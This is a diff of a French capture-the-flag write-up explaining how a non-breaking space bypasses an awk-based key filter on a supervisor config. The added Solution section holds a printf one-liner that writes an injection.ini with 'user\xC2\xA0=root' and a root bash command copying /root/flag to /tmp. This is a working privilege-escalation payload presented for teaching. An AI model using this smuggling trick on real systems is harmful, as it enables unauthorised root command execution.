@@ -291,26 +291,21 @@ Cette ligne de code qui semble sortit d'un grimoire fais en realiter les choses 
 - `sub(/[ \t]+$/, "");`  Nettoie tout les espaces blanc de la **fin** de la chaine
 - On envoie le tout avec print dans `${key}`
 
-## Test
-
-Resultat: 
-```
-CLEANED_STRING=$(echo "key=value" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}') && echo "${CLEANED_STRING}"
-key=value
-CLEANED_STRING=$(echo "    key    =   value    " | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}') && echo "${CLEANED_STRING}"
-key   =   value
-```
-
-Donc les espaces ne sont pas nettoyer entre la cle et la valeur.
+Donc si nous avons un charactere qui n'est pas nettoyer par ce code et qui est valide pour supervisor...
 
 ## Solution
 
+`printf 'user\xC2\xA0=root\ncommand=/bin/bash -c "cat /root/flag > /tmp/owned"' > injection.ini`
+
+Car les espaces ASCII (\x20) et les tabulations (\x09) sont generalement les espaces blanc gerer en bash et \xC2\xA0 est NBSP (Non-Breaking space)
+
+
 ```ini
 [program:footpad]
-user =root
+user =root #<---- le space ici est \xC2\xA0
 command=/bin/bash -c "cat /root/flag > /tmp/owned"
 ```
-Car la cle sera user[::space::] qui n'est pas egale a user
+Car la cle sera user[::NBSP::] qui n'est pas egale a user
 
 ```bash
 ┌[drgn@MeowMeow.catnip]
